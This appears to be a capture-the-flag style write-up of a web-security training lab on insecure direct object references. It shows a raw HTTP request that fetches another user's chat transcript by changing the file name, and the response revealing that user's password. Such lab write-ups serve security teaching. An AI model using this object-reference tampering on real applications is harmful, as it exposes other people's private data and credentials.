# Lab: Insecure direct object references

- The application allows downloading the chat-history when we click on `View transcript` at `/chat`.
- If we modify the static file name, we can access chat history for Carlos that discloses his password.

```
GET /download-transcript/1.txt HTTP/1.1
Host: acf51fa91fed84f8c0392d090053000b.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://acf51fa91fed84f8c0392d090053000b.web-security-academy.net/chat
Connection: close
Cookie: session=TBHLI5jBMJrI88wwn0YhXOCNLcieNclS
```

```
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename="1.txt"
Connection: close
Content-Length: 520

CONNECTED: -- Now chatting with Hal Pline --
You: Hi Hal, I think I've forgotten my password and need confirmation that I've got the right one
Hal Pline: Sure, no problem, you seem like a nice guy. Just tell me your password and I'll confirm whether it's correct or not.
You: Wow you're so nice, thanks. I've heard from other people that you can be a right ****
Hal Pline: Takes one to know one
You: Ok so my password is dkgseszfcy8bk3nnbg43. Is that right?
Hal Pline: Yes it is!
You: Ok thanks, bye!
Hal Pline: Do one!
```

